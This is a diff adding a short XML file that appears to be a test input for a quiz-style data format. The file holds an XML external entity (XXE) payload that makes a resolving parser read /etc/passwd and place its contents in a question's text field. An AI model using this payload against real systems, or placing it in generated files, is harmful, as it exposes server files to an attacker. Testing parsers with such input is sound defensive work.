@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<data>
+    <question>
+        <text>&xxe;</text>
+        <choice>A</choice>
+        <choice>B</choice>
+        <choice>C</choice>
+    </question>
+</data>
